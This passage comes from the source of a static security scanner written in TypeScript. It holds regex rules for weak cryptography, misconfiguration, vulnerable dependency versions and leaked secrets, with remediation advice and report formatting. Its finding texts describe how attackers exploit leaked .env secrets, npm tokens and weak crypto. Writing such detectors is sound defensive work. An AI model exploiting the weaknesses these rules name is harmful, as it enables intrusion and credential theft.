    pattern: /(?:createHash|hashlib\.md5|MD5|md5)\s*\(\s*['"]?md5['"]?\s*\)?\s*\.?(?:update|digest|hexdigest)?\s*\(?[^)]*(?:password|passwd|pass|pwd)/gi,
    severity: 'critical',
    cwe: 'CWE-328',
    description: 'MD5 used for password hashing — cryptographically broken, rainbow table attacks trivial',
  },
  {
    name: 'MD5 Usage (general)',
    pattern: /(?:createHash\s*\(\s*['"]md5['"]\)|hashlib\.md5|MD5\s*\(|\.md5\s*\()/gi,
    severity: 'medium',
    cwe: 'CWE-328',
    description: 'MD5 usage detected — broken hash function, not suitable for security purposes',
  },
  {
    name: 'SHA1 for Password Hashing',
    pattern: /(?:createHash|hashlib\.sha1|SHA1|sha1)\s*\(\s*['"]?sha1['"]?\s*\)?\s*\.?(?:update|digest|hexdigest)?\s*\(?[^)]*(?:password|passwd|pass|pwd)/gi,
    severity: 'critical',
    cwe: 'CWE-328',
    description: 'SHA1 used for password hashing — cryptographically weakened, use bcrypt/argon2',
  },
  {
    name: 'SHA1 Usage (general)',
    pattern: /(?:createHash\s*\(\s*['"]sha1['"]\)|hashlib\.sha1|SHA1\s*\(|\.sha1\s*\()/gi,
    severity: 'low',
    cwe: 'CWE-328',
    description: 'SHA1 usage detected — weakened hash function, consider SHA-256+',
  },
  {
    name: 'ECB Mode',
    pattern: /(?:ECB|ecb|AES\.MODE_ECB|mode:\s*['"]ecb['"]|cipher\s*=.*ecb)/gi,
    severity: 'high',
    cwe: 'CWE-327',
    description: 'ECB mode encryption — identical plaintext blocks produce identical ciphertext (pattern leakage)',
  },
  {
    name: 'Hardcoded Encryption Key',
    pattern: /(?:createCipher|createCipheriv|AES\.new|Cipher|encrypt)\s*\(\s*['"][^'"]{8,}['"]/gi,
    severity: 'critical',
    cwe: 'CWE-321',
    description: 'Encryption key hardcoded in source — compromise of source = compromise of all encrypted data',
  },
  {
    name: 'Hardcoded IV/Nonce',
    pattern: /(?:iv|nonce|IV|NONCE)\s*[=:]\s*(?:Buffer\.from\s*\(\s*)?['"][^'"]{8,}['"]/gi,
    severity: 'high',
    cwe: 'CWE-329',
    description: 'Hardcoded initialization vector — IV reuse breaks encryption security',
  },
  {
    name: 'Math.random() for Security',
    pattern: /Math\.random\s*\(\s*\)\s*.*(?:token|key|secret|password|salt|nonce|iv|session|csrf|random.*id|uuid)/gi,
    severity: 'high',
    cwe: 'CWE-338',
    description: 'Math.random() used for security-sensitive value — predictable PRNG',
  },
  {
    name: 'Math.random() General',
    pattern: /Math\.random\s*\(\s*\)/g,
    severity: 'low',
    cwe: 'CWE-338',
    description: 'Math.random() usage — not cryptographically secure (use crypto.randomBytes for security)',
  },
  {
    name: 'Weak Key Size',
    pattern: /(?:generateKey|createDiffieHellman|RSA|rsa)\s*\(\s*(?:512|768|1024)\b/gi,
    severity: 'high',
    cwe: 'CWE-326',
    description: 'Weak cryptographic key size — 1024-bit RSA is breakable, use >= 2048',
  },
  {
    name: 'DES/3DES Usage',
    pattern: /(?:DES|des|3DES|TripleDES|DESede|createCipher\s*\(\s*['"]des)/gi,
    severity: 'high',
    cwe: 'CWE-327',
    description: 'DES/3DES encryption — deprecated and weak, use AES-256',
  },
  {
    name: 'RC4 Usage',
    pattern: /(?:RC4|rc4|ARC4|ARCFOUR|createCipher\s*\(\s*['"]rc4)/gi,
    severity: 'high',
    cwe: 'CWE-327',
    description: 'RC4 stream cipher — multiple known vulnerabilities, completely broken',
  },
  {
    name: 'Deprecated createCipher',
    pattern: /createCipher\s*\(\s*['"](?!aes-256-gcm)/gi,
    severity: 'medium',
    cwe: 'CWE-327',
    description: 'crypto.createCipher is deprecated — use createCipheriv with explicit IV',
  },
  {
    name: 'No Salt in Hashing',
    pattern: /(?:createHash|hashlib)\s*\(\s*['"]sha(?:256|384|512)['"]\s*\)\s*\.update\s*\(\s*(?:password|passwd|pass|pwd)/gi,
    severity: 'high',
    cwe: 'CWE-916',
    description: 'Password hashed without salt — vulnerable to rainbow table attacks',
  },
  {
    name: 'Bcrypt Low Rounds',
    pattern: /(?:bcrypt|argon2).*(?:rounds?|cost|saltRounds)\s*[=:]\s*(?:[1-9]|10)\b/gi,
    severity: 'medium',
    cwe: 'CWE-916',
    description: 'Password hashing with too few rounds — increase to at least 12 for bcrypt',
  },
]

// ── Config Issue Patterns ──────────────────────────────────────────────────────

interface ConfigPattern {
  name: string
  pattern: RegExp
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
  cwe: string
  description: string
  fileTypes?: string[]
}

const CONFIG_PATTERNS: ConfigPattern[] = [
  {
    name: 'Debug Mode Enabled',
    pattern: /(?:DEBUG|debug)\s*[=:]\s*(?:true|1|['"]true['"]|['"]1['"])/g,
    severity: 'medium',
    cwe: 'CWE-489',
    description: 'Debug mode enabled — may expose verbose errors, stack traces, or internal state',
  },
  {
    name: 'CORS Wildcard',
    pattern: /(?:Access-Control-Allow-Origin|cors|CORS|allowOrigin|origin)\s*[=:]\s*['"]?\*/g,
    severity: 'high',
    cwe: 'CWE-942',
    description: 'CORS allows all origins (*) — any website can make authenticated requests',
  },
  {
    name: 'CORS Credentials with Wildcard',
    pattern: /(?:Access-Control-Allow-Credentials|credentials)\s*[=:]\s*(?:true|['"]true['"])/g,
    severity: 'high',
    cwe: 'CWE-942',
    description: 'CORS allows credentials — combined with permissive origin, enables session hijacking',
  },
  {
    name: 'Missing Security Headers',
    pattern: /(?:helmet|Helmet|security-headers|X-Content-Type-Options|X-Frame-Options|Strict-Transport-Security)/g,
    severity: 'info',
    cwe: 'CWE-693',
    description: 'Security header configuration detected (positive finding)',
  },
  {
    name: 'Default Credentials',
    pattern: /(?:username|user|admin|root)\s*[=:]\s*['"](?:admin|root|test|user|default|password|guest|demo)['"].*(?:password|passwd|pass|pwd)\s*[=:]\s*['"](?:admin|root|test|password|pass|123456|default|guest|demo)['"]/gi,
    severity: 'critical',
    cwe: 'CWE-798',
    description: 'Default/test credentials in source code',
  },
  {
    name: 'Verbose Error Messages',
    pattern: /(?:res\.(?:send|json|status)\s*\(\s*(?:500|400|401|403|404|422)\s*\)\s*\.(?:send|json)\s*\(\s*(?:err|error)\.(?:stack|message)|catch\s*\(\s*(?:err|error|e)\s*\)\s*\{[^}]*(?:res\.send|res\.json)\s*\(\s*(?:err|error|e)(?:\.stack|\.message)?)/gi,
    severity: 'medium',
    cwe: 'CWE-209',
    description: 'Error details sent to client — may leak stack traces, file paths, or internal info',
  },
  {
    name: 'Stack Trace in Response',
    pattern: /(?:err|error|e)\.stack\s*.*(?:res\.send|res\.json|response\.send|response\.json|return|send)/gi,
    severity: 'medium',
    cwe: 'CWE-209',
    description: 'Stack trace sent in response — reveals internal file paths and code structure',
  },
  {
    name: 'Source Maps in Production',
    pattern: /(?:sourcemap|sourceMap|source-map)\s*[=:]\s*(?:true|['"]true['"]|['"]inline['"])/gi,
    severity: 'low',
    cwe: 'CWE-540',
    description: 'Source maps enabled — may expose original source code in production',
  },
  {
    name: 'Directory Listing Enabled',
    pattern: /(?:serveIndex|directory-listing|autoindex|Options\s+Indexes)/gi,
    severity: 'medium',
    cwe: 'CWE-548',
    description: 'Directory listing enabled — exposes file structure to attackers',
  },
  {
    name: 'X-Powered-By Header',
    pattern: /(?:X-Powered-By|x-powered-by|poweredBy)/g,
    severity: 'low',
    cwe: 'CWE-200',
    description: 'X-Powered-By header leaks server technology — aids fingerprinting',
  },
  {
    name: 'Insecure TLS Version',
    pattern: /(?:TLSv1\.0|TLSv1\.1|SSLv2|SSLv3|ssl_protocols\s+.*TLSv1(?:\.0|\.1)?|minVersion\s*[=:]\s*['"]TLSv1(?:\.0|\.1)?['"])/gi,
    severity: 'high',
    cwe: 'CWE-327',
    description: 'Insecure TLS/SSL version — TLS 1.0/1.1 and SSLv2/v3 have known vulnerabilities',
  },
  {
    name: 'HTTP (not HTTPS)',
    pattern: /(?:http:\/\/(?!localhost|127\.0\.0\.1|0\.0\.0\.0|::1|\[::1\]|example\.com))[a-zA-Z0-9.-]+/g,
    severity: 'low',
    cwe: 'CWE-319',
    description: 'HTTP URL detected — traffic is unencrypted',
  },
  {
    name: 'Permissive File Upload',
    pattern: /(?:multer|formidable|busboy|express-fileupload).*(?!fileFilter|limits)/gi,
    severity: 'medium',
    cwe: 'CWE-434',
    description: 'File upload without visible file type or size filtering',
  },
  {
    name: 'GraphQL Introspection Enabled',
    pattern: /(?:introspection\s*:\s*true|enableIntrospection)/gi,
    severity: 'low',
    cwe: 'CWE-200',
    description: 'GraphQL introspection enabled — exposes full API schema to attackers',
  },
  {
    name: 'Disabled Security Feature',
    pattern: /(?:rejectUnauthorized|strictSSL|verify_ssl|VERIFY_SSL)\s*[=:]\s*(?:false|0)/gi,
    severity: 'high',
    cwe: 'CWE-295',
    description: 'SSL/TLS certificate verification disabled — vulnerable to MITM attacks',
  },
  {
    name: 'Admin Panel Exposed',
    pattern: /(?:\/admin|\/dashboard|\/manage|\/panel|\/control)(?:['"]|\s|$)/gi,
    severity: 'low',
    cwe: 'CWE-200',
    description: 'Admin panel route detected — ensure authentication and access control',
  },
]

// ── Dependency Vulnerability Patterns ──────────────────────────────────────────

interface DepPattern {
  name: string
  pattern: RegExp
  severity: 'critical' | 'high' | 'medium' | 'low'
  description: string
}

const DEP_PATTERNS: DepPattern[] = [
  {
    name: 'Lodash Prototype Pollution',
    pattern: /"lodash"\s*:\s*"[<^~]?[0-3]\./g,
    severity: 'critical',
    description: 'Lodash < 4.x has prototype pollution vulnerabilities (CVE-2018-16487)',
  },
  {
    name: 'Express < 4.17.3',
    pattern: /"express"\s*:\s*"[<^~]?4\.(?:1[0-6]|[0-9])\./g,
    severity: 'high',
    description: 'Express < 4.17.3 has open redirect vulnerability (CVE-2022-24999)',
  },
  {
    name: 'Axios SSRF',
    pattern: /"axios"\s*:\s*"[<^~]?0\.(?:2[0-1]|1\d|[0-9])\./g,
    severity: 'high',
    description: 'Axios < 0.22.0 follows redirects to internal hosts (SSRF)',
  },
  {
    name: 'jsonwebtoken < 9',
    pattern: /"jsonwebtoken"\s*:\s*"[<^~]?[0-8]\./g,
    severity: 'high',
    description: 'jsonwebtoken < 9.0.0 has algorithm confusion vulnerability',
  },
  {
    name: 'node-fetch SSRF',
    pattern: /"node-fetch"\s*:\s*"[<^~]?[12]\./g,
    severity: 'medium',
    description: 'node-fetch < 3.x has redirect-based SSRF issues',
  },
  {
    name: 'Minimatch ReDoS',
    pattern: /"minimatch"\s*:\s*"[<^~]?[0-2]\./g,
    severity: 'medium',
    description: 'minimatch < 3.0.5 has ReDoS vulnerability',
  },
  {
    name: 'tar Path Traversal',
    pattern: /"tar"\s*:\s*"[<^~]?[0-5]\./g,
    severity: 'high',
    description: 'tar < 6.x has path traversal vulnerability (CVE-2021-32803)',
  },
  {
    name: 'Underscore Arbitrary Code Execution',
    pattern: /"underscore"\s*:\s*"[<^~]?1\.(?:1[0-2]|[0-9])\./g,
    severity: 'high',
    description: 'Underscore < 1.13.6 has arbitrary code execution via template()',
  },
  {
    name: 'Shell.js Command Injection',
    pattern: /"shelljs"\s*:\s*"[<^~]?0\.[0-7]\./g,
    severity: 'high',
    description: 'shelljs < 0.8.5 has command injection vulnerability',
  },
  {
    name: 'Handlebars Prototype Pollution',
    pattern: /"handlebars"\s*:\s*"[<^~]?[0-3]\./g,
    severity: 'high',
    description: 'Handlebars < 4.7.7 has prototype pollution (CVE-2021-23369)',
  },
  {
    name: 'Moment.js ReDoS',
    pattern: /"moment"\s*:\s*"[<^~]?2\.(?:2[0-8]|1\d|[0-9])\./g,
    severity: 'medium',
    description: 'moment < 2.29.4 has ReDoS vulnerability in date parsing',
  },
  {
    name: 'dot-prop Prototype Pollution',
    pattern: /"dot-prop"\s*:\s*"[<^~]?[0-4]\./g,
    severity: 'high',
    description: 'dot-prop < 5.1.1 has prototype pollution vulnerability',
  },
]

// ── Scanning Functions ─────────────────────────────────────────────────────────

function scanSecrets(files: FileEntry[], baseDir: string): Finding[] {
  const findings: Finding[] = []
  let findingId = 0

  for (const file of files) {
    const relPath = relative(baseDir, file.path)

    // Check if this is a .env file that should not be committed
    const basename = file.path.split('/').pop() || ''
    if (basename.startsWith('.env') && basename !== '.env.example' && basename !== '.env.template') {
      findings.push({
        id: `SEC-${++findingId}`,
        severity: 'critical',
        category: 'Secrets',
        title: 'Environment File in Source',
        description: `.env file found in repository — likely contains secrets`,
        file: relPath,
        line: 1,
        evidence: `File: ${basename} (${file.lines.length} lines)`,
        exploitation: 'Attacker reads .env to obtain database credentials, API keys, and internal service URLs',
        cwe: 'CWE-538',
        remediation: 'Add to .gitignore, rotate all secrets, use .env.example for templates',
      })
    }

    for (const pattern of SECRET_PATTERNS) {
      // Special handling: env var pattern only for .env files
      if (pattern.name === 'Env File in Source' && !basename.startsWith('.env')) continue
      if (pattern.name !== 'Env File in Source' && basename.startsWith('.env')) {
        // .env files checked above, skip generic patterns for them to avoid noise
      }

      for (let i = 0; i < file.lines.length; i++) {
        const line = file.lines[i]

        // Skip comments
        const trimmed = line.trim()
        if (trimmed.startsWith('//') || trimmed.startsWith('#') || trimmed.startsWith('*') || trimmed.startsWith('/*')) {
          // Unless the comment itself contains a secret (people paste keys in comments)
          if (!pattern.pattern.test(line)) continue
        }

        // Skip test/example files for some patterns
        if (relPath.includes('.test.') || relPath.includes('.spec.') || relPath.includes('__test__')) {
          if (pattern.severity === 'medium' || pattern.severity === 'low') continue
        }

        // Reset regex lastIndex
        pattern.pattern.lastIndex = 0
        const match = pattern.pattern.exec(line)
        if (match) {
          // Avoid false positives: skip if line looks like a type definition or import
          if (/^(?:import|export|type|interface|const\s+\w+\s*:\s*string|\/\/|#|\*|\/\*)/.test(trimmed)) {
            // But still flag if it has an actual secret value
            if (!/[=:]\s*['"][^'"]{10,}['"]/.test(line) && !line.includes('-----BEGIN')) continue
          }

          // Mask the evidence to avoid leaking the actual secret in reports
          const evidence = maskSecret(line.trim(), match[0])

          findings.push({
            id: `SEC-${++findingId}`,
            severity: pattern.severity,
            category: 'Secrets',
            title: pattern.name,
            description: pattern.description,
            file: relPath,
            line: i + 1,
            evidence,
            exploitation: `Attacker uses leaked ${pattern.name.toLowerCase()} to access protected resources, impersonate services, or exfiltrate data`,
            cwe: pattern.cwe,
            remediation: 'Move to environment variables, rotate the compromised credential, add file to .gitignore',
          })
        }
      }
    }
  }

  return findings
}

function maskSecret(line: string, matched: string): string {
  if (matched.length <= 8) return line
  const visible = matched.slice(0, 4)
  const masked = visible + '*'.repeat(Math.min(matched.length - 4, 20))
  return line.replace(matched, masked)
}

function scanInjection(files: FileEntry[], baseDir: string): Finding[] {
  const findings: Finding[] = []
  let findingId = 0

  for (const file of files) {
    const relPath = relative(baseDir, file.path)

    // Skip non-code files
    const codeExts = new Set(['.ts', '.js', '.tsx', '.jsx', '.py', '.rb', '.go', '.java', '.php', '.rs', '.c', '.cpp', '.cs', '.mjs', '.cjs'])
    if (!codeExts.has(file.ext)) continue

    for (const pattern of INJECTION_PATTERNS) {
      for (let i = 0; i < file.lines.length; i++) {
        const line = file.lines[i]
        const trimmed = line.trim()

        // Skip comments
        if (trimmed.startsWith('//') || trimmed.startsWith('#') || trimmed.startsWith('*')) continue

        // Reset regex
        pattern.pattern.lastIndex = 0
        if (pattern.pattern.test(line)) {
          // Extra context: check surrounding lines for sanitization
          const contextBefore = file.lines.slice(Math.max(0, i - 5), i).join('\n')
          const contextAfter = file.lines.slice(i + 1, Math.min(file.lines.length, i + 3)).join('\n')
          const context = contextBefore + '\n' + line + '\n' + contextAfter

          // Look for sanitization indicators to reduce false positives
          const sanitized = /(?:sanitize|escape|encode|validate|zod|joi|yup|ajv|parameterized|prepared|placeholder|\$[0-9]+|%s)/i.test(context)
          const effectiveSeverity = sanitized ? lowerSeverity(pattern.severity) : pattern.severity

          findings.push({
            id: `INJ-${++findingId}`,
            severity: effectiveSeverity,
            category: pattern.category,
            title: pattern.name,
            description: pattern.description,
            file: relPath,
            line: i + 1,
            evidence: trimmed.slice(0, 200),
            exploitation: pattern.exploitation,
            cwe: pattern.cwe,
            remediation: getInjectionRemediation(pattern.category),
          })
        }
      }
    }
  }

  return findings
}

function scanAuth(files: FileEntry[], baseDir: string): Finding[] {
  const findings: Finding[] = []
  let findingId = 0

  for (const file of files) {
    const relPath = relative(baseDir, file.path)
    const codeExts = new Set(['.ts', '.js', '.tsx', '.jsx', '.py', '.rb', '.go', '.java', '.php', '.mjs', '.cjs'])
    if (!codeExts.has(file.ext)) continue

    for (const pattern of AUTH_PATTERNS) {
      for (let i = 0; i < file.lines.length; i++) {
        const line = file.lines[i]
        const trimmed = line.trim()
        if (trimmed.startsWith('//') || trimmed.startsWith('#') || trimmed.startsWith('*')) continue

        pattern.pattern.lastIndex = 0
        if (pattern.pattern.test(line)) {
          // Check anti-pattern (presence means likely already mitigated)
          if (pattern.antiPattern) {
            const context = file.lines.slice(Math.max(0, i - 10), Math.min(file.lines.length, i + 10)).join('\n')
            pattern.antiPattern.lastIndex = 0
            if (pattern.antiPattern.test(context)) continue
          }

          findings.push({
            id: `AUTH-${++findingId}`,
            severity: pattern.severity,
            category: 'Authentication',
            title: pattern.name,
            description: pattern.description,
            file: relPath,
            line: i + 1,
            evidence: trimmed.slice(0, 200),
            exploitation: `Attacker exploits ${pattern.name.toLowerCase()} to bypass authentication, escalate privileges, or hijack sessions`,
            cwe: pattern.cwe,
            remediation: getAuthRemediation(pattern.name),
          })
        }
      }
    }
  }

  return findings
}

function scanCrypto(files: FileEntry[], baseDir: string): Finding[] {
  const findings: Finding[] = []
  let findingId = 0

  for (const file of files) {
    const relPath = relative(baseDir, file.path)
    const codeExts = new Set(['.ts', '.js', '.tsx', '.jsx', '.py', '.rb', '.go', '.java', '.php', '.rs', '.c', '.cpp', '.cs', '.mjs', '.cjs'])
    if (!codeExts.has(file.ext)) continue

    for (const pattern of CRYPTO_PATTERNS) {
      for (let i = 0; i < file.lines.length; i++) {
        const line = file.lines[i]
        const trimmed = line.trim()
        if (trimmed.startsWith('//') || trimmed.startsWith('#') || trimmed.startsWith('*')) continue

        pattern.pattern.lastIndex = 0
        if (pattern.pattern.test(line)) {
          findings.push({
            id: `CRYPTO-${++findingId}`,
            severity: pattern.severity,
            category: 'Cryptography',
            title: pattern.name,
            description: pattern.description,
            file: relPath,
            line: i + 1,
            evidence: trimmed.slice(0, 200),
            exploitation: `Attacker exploits weak cryptography: ${pattern.description}`,
            cwe: pattern.cwe,
            remediation: getCryptoRemediation(pattern.name),
          })
        }
      }
    }
  }

  return findings
}

function scanConfig(files: FileEntry[], baseDir: string): Finding[] {
  const findings: Finding[] = []
  let findingId = 0

  for (const file of files) {
    const relPath = relative(baseDir, file.path)

    for (const pattern of CONFIG_PATTERNS) {
      for (let i = 0; i < file.lines.length; i++) {
        const line = file.lines[i]
        const trimmed = line.trim()
        if (trimmed.startsWith('//') || trimmed.startsWith('#') || trimmed.startsWith('*')) continue

        pattern.pattern.lastIndex = 0
        if (pattern.pattern.test(line)) {
          // Skip positive findings (info severity for detected mitigations)
          if (pattern.severity === 'info' && pattern.name === 'Missing Security Headers') continue

          findings.push({
            id: `CFG-${++findingId}`,
            severity: pattern.severity,
            category: 'Configuration',
            title: pattern.name,
            description: pattern.description,
            file: relPath,
            line: i + 1,
            evidence: trimmed.slice(0, 200),
            exploitation: `Attacker leverages misconfiguration: ${pattern.description}`,
            cwe: pattern.cwe,
            remediation: getConfigRemediation(pattern.name),
          })
        }
      }
    }
  }

  return findings
}

function scanDeps(files: FileEntry[], baseDir: string): Finding[] {
  const findings: Finding[] = []
  let findingId = 0

  // Only scan package.json files
  const pkgFiles = files.filter(f => f.path.endsWith('package.json'))

  for (const file of pkgFiles) {
    const relPath = relative(baseDir, file.path)

    for (const pattern of DEP_PATTERNS) {
      pattern.pattern.lastIndex = 0
      const match = pattern.pattern.exec(file.content)
      if (match) {
        const lineIndex = file.content.slice(0, match.index).split('\n').length
        findings.push({
          id: `DEP-${++findingId}`,
          severity: pattern.severity,
          category: 'Dependencies',
          title: pattern.name,
          description: pattern.description,
          file: relPath,
          line: lineIndex,
          evidence: match[0].trim(),
          exploitation: `Attacker exploits known vulnerability in dependency: ${pattern.description}`,
          remediation: 'Update to the latest patched version. Run npm audit fix or equivalent.',
        })
      }
    }

    // Check for lack of lockfile
    const lockFile = file.path.replace('package.json', 'package-lock.json')
    const yarnLock = file.path.replace('package.json', 'yarn.lock')
    const pnpmLock = file.path.replace('package.json', 'pnpm-lock.yaml')
    if (!existsSync(lockFile) && !existsSync(yarnLock) && !existsSync(pnpmLock)) {
      findings.push({
        id: `DEP-${++findingId}`,
        severity: 'medium',
        category: 'Dependencies',
        title: 'Missing Lock File',
        description: 'No package lock file found — builds are not reproducible and vulnerable to dependency confusion',
        file: relPath,
        line: 1,
        evidence: 'package.json without lock file',
        exploitation: 'Attacker publishes malicious package version that gets installed due to lack of version pinning',
        remediation: 'Run npm install to generate package-lock.json and commit it',
      })
    }
  }

  // Check for .npmrc with registry overrides
  const npmrcFiles = files.filter(f => f.path.endsWith('.npmrc'))
  for (const file of npmrcFiles) {
    const relPath = relative(baseDir, file.path)
    if (file.content.includes('registry=') && !file.content.includes('registry=https://registry.npmjs.org')) {
      findings.push({
        id: `DEP-${++findingId}`,
        severity: 'medium',
        category: 'Dependencies',
        title: 'Custom npm Registry',
        description: 'Custom npm registry configured — verify it is trusted and uses HTTPS',
        file: relPath,
        line: 1,
        evidence: file.lines.find(l => l.includes('registry='))?.trim() || '',
        exploitation: 'Attacker compromises custom registry to serve malicious packages',
        remediation: 'Ensure registry uses HTTPS and is a trusted source',
      })
    }
    // Check for auth tokens in .npmrc
    if (file.content.includes('_authToken') || file.content.includes('_auth=')) {
      findings.push({
        id: `DEP-${++findingId}`,
        severity: 'high',
        category: 'Dependencies',
        title: 'npm Auth Token in File',
        description: 'npm authentication token found in .npmrc — should use environment variable',
        file: relPath,
        line: file.lines.findIndex(l => l.includes('_authToken') || l.includes('_auth=')) + 1,
        evidence: '[auth token masked]',
        exploitation: 'Attacker uses leaked npm token to publish malicious versions of your packages',
        cwe: 'CWE-798',
        remediation: 'Use NPM_TOKEN environment variable instead of hardcoding in .npmrc',
      })
    }
  }

  return findings
}

// ── Helper Functions ───────────────────────────────────────────────────────────

function lowerSeverity(severity: Finding['severity']): Finding['severity'] {
  switch (severity) {
    case 'critical': return 'high'
    case 'high': return 'medium'
    case 'medium': return 'low'
    default: return severity
  }
}

function getInjectionRemediation(category: string): string {
  switch (category) {
    case 'SQL Injection':
      return 'Use parameterized queries / prepared statements. Never concatenate user input into SQL strings. Use an ORM like Prisma, Drizzle, or Sequelize.'
    case 'NoSQL Injection':
      return 'Validate and sanitize all query parameters. Use schema validation (zod/joi). Never pass raw user input to MongoDB operators.'
    case 'XSS':
      return 'Use framework auto-escaping (React JSX). Avoid innerHTML/dangerouslySetInnerHTML. Sanitize with DOMPurify if raw HTML is needed. Set Content-Security-Policy headers.'
    case 'Code Injection':
      return 'Remove eval() and Function() usage. Use JSON.parse for data parsing. Use safe alternatives for dynamic code (vm2 sandbox if absolutely needed).'
    case 'Command Injection':
      return 'Use execFile/execFileSync instead of exec (no shell interpretation). Validate and sanitize all arguments. Use a whitelist of allowed commands.'
    case 'Path Traversal':
      return 'Use path.resolve and verify the resolved path starts with the expected base directory. Never use user input directly in file paths. Use path.normalize and check for "..".'
    case 'SSRF':
      return 'Validate URLs against an allowlist. Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x). Disable redirect following or validate each redirect destination.'
    case 'Template Injection':
      return 'Never pass user input as template strings. Use template data context only. Enable sandbox mode in template engines.'
    case 'LDAP Injection':
      return 'Escape special characters in LDAP queries. Use parameterized LDAP searches. Validate input against expected patterns.'
    case 'Deserialization':
      return 'Use schema validation (zod) after parsing. Avoid unsafe deserializers (pickle, yaml.load). Use yaml.safe_load in Python.'
    case 'Prototype Pollution':
      return 'Freeze Object.prototype. Use Object.create(null) for dictionaries. Validate keys against __proto__ and constructor. Use Map instead of plain objects.'
    case 'XXE':
      return 'Disable external entity processing in XML parser. Use defusedxml in Python. Set parser features to disallow DTDs.'
    case 'Open Redirect':
      return 'Validate redirect URLs against an allowlist of domains. Use relative paths only. Check URL hostname after parsing.'
    case 'Header Injection':
      return 'Validate header values. Strip CR/LF characters. Use framework-provided header methods that auto-escape.'
    case 'ReDoS':
      return 'Never construct regexes from user input. Use RE2 for user-provided patterns. Set regex execution timeouts. Use non-backtracking engines.'
    default:
      return 'Validate and sanitize all user input. Apply defense in depth.'
  }
}

function getAuthRemediation(name: string): string {
  switch (name) {
    case 'Hardcoded JWT Secret':
    case 'Weak JWT Secret':
      return 'Use a strong, random JWT secret from environment variables. Generate with: node -e "console.log(require(\'crypto\').randomBytes(64).toString(\'hex\'))"'
    case 'JWT None Algorithm':
      return 'Explicitly specify allowed algorithms in jwt.verify: { algorithms: ["HS256"] }. Never include "none".'
    case 'Missing Auth Middleware (Express)':
      return 'Add authentication middleware before route handlers. Use passport.js, express-jwt, or custom auth middleware.'
    case 'Missing Rate Limiting':
      return 'Add express-rate-limit to auth endpoints. Example: rateLimit({ windowMs: 15*60*1000, max: 5 })'
    case 'Insecure Cookie (no httpOnly)':
      return 'Set httpOnly: true on all session/auth cookies to prevent JavaScript access.'
    case 'Insecure Cookie (no secure flag)':
      return 'Set secure: true on all cookies to ensure HTTPS-only transmission.'
    case 'Session Fixation':
      return 'Regenerate session ID after authentication. Use req.session.regenerate() in Express.'
    case 'Missing CSRF Protection':
      return 'Add CSRF middleware (csurf for Express). Use SameSite=Strict cookies. Validate Origin header.'
    case 'Weak Password Validation':
      return 'Require minimum 12 characters, mix of upper/lower/numbers/symbols. Use zxcvbn for strength estimation.'
    default:
      return 'Follow OWASP authentication best practices. Implement defense in depth.'
  }
}

function getCryptoRemediation(name: string): string {
  switch (name) {
    case 'MD5 for Password Hashing':
    case 'SHA1 for Password Hashing':
    case 'No Salt in Hashing':
      return 'Use bcrypt (cost >= 12), scrypt, or argon2id for password hashing. These include salt and are intentionally slow.'
    case 'MD5 Usage (general)':
    case 'SHA1 Usage (general)':
      return 'Use SHA-256 or SHA-3 for general hashing. MD5/SHA1 are only acceptable for non-security checksums.'
    case 'ECB Mode':
      return 'Use AES-GCM (authenticated encryption) or AES-CBC with HMAC. Never use ECB mode.'
    case 'Hardcoded Encryption Key':
    case 'Hardcoded IV/Nonce':
      return 'Store keys in environment variables or a key management service (AWS KMS, HashiCorp Vault). Generate IVs randomly for each encryption.'
    case 'Math.random() for Security':
    case 'Math.random() General':
      return 'Use crypto.randomBytes() or crypto.getRandomValues() for security-sensitive random values.'
    case 'Weak Key Size':
      return 'Use minimum 2048-bit RSA keys (4096 recommended). Use 256-bit keys for symmetric encryption.'
    case 'DES/3DES Usage':
    case 'RC4 Usage':
      return 'Migrate to AES-256-GCM. DES, 3DES, and RC4 are cryptographically broken.'
    case 'Deprecated createCipher':
      return 'Use crypto.createCipheriv() with AES-256-GCM and a random IV.'
    case 'Bcrypt Low Rounds':
      return 'Increase bcrypt salt rounds to at least 12 (recommended: 12-14). Balance security vs. performance.'
    default:
      return 'Follow NIST cryptographic guidelines. Use well-tested libraries, not custom implementations.'
  }
}

function getConfigRemediation(name: string): string {
  switch (name) {
    case 'Debug Mode Enabled':
      return 'Disable debug mode in production. Use NODE_ENV=production. Remove debug flags from deployment configs.'
    case 'CORS Wildcard':
    case 'CORS Credentials with Wildcard':
      return 'Specify exact allowed origins. Never use * with credentials. Validate Origin header server-side.'
    case 'Default Credentials':
      return 'Remove all default/test credentials. Use environment variables. Enforce credential rotation.'
    case 'Verbose Error Messages':
    case 'Stack Trace in Response':
      return 'Use generic error messages in production. Log detailed errors server-side only. Never send stack traces to clients.'
    case 'Insecure TLS Version':
      return 'Require TLS 1.2 minimum (TLS 1.3 preferred). Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1.'
    case 'Disabled Security Feature':
      return 'Never disable SSL verification in production. If needed for development, ensure it is not deployed.'
    case 'Directory Listing Enabled':
      return 'Disable directory listing. Use explicit routes for file serving.'
    case 'Permissive File Upload':
      return 'Validate file types (check magic bytes, not just extension). Limit file size. Store outside webroot. Scan for malware.'
    default:
      return 'Review configuration against security best practices. Apply principle of least privilege.'
  }
}

// ── Report Formatting ──────────────────────────────────────────────────────────

function formatFindings(findings: Finding[]): string {
  if (findings.length === 0) return '_No findings in this category._\n'

  const lines: string[] = []
  const sorted = findings.sort((a, b) => SEVERITY_SCORE[b.severity] - SEVERITY_SCORE[a.severity])

  for (const f of sorted) {
    lines.push(`### ${f.id}: ${f.title}`)
    lines.push(`**Severity**: ${f.severity.toUpperCase()} | **Category**: ${f.category}${f.cwe ? ` | **CWE**: ${f.cwe}` : ''}`)
    lines.push(`**File**: \`${f.file}\` (line ${f.line})`)
    lines.push(`**Evidence**: \`${f.evidence.slice(0, 150)}\``)
    lines.push(`**Description**: ${f.description}`)
    lines.push(`**Exploitation**: ${f.exploitation}`)
    if (f.remediation) {
      lines.push(`**Remediation**: ${f.remediation}`)
    }
    lines.push('')
  }

  return lines.join('\n')
}

function calculateRiskScore(findings: Finding[]): number {
  if (findings.length === 0) return 0
  let score = 0
  for (const f of findings) {
    score += SEVERITY_SCORE[f.severity] || 0
  }
  // Normalize to 0-100 scale
  // A single critical = 10, normalize so 10 criticals = 100
  return Math.min(100, Math.round(score))
}

function riskGrade(score: number): string {
  if (score === 0) return 'A+'
  if (score <= 5) return 'A'
  if (score <= 15) return 'B'
  if (score <= 30) return 'C'
  if (score <= 50) return 'D'
  return 'F'
}

function severityCounts(findings: Finding[]): Record<string, number> {
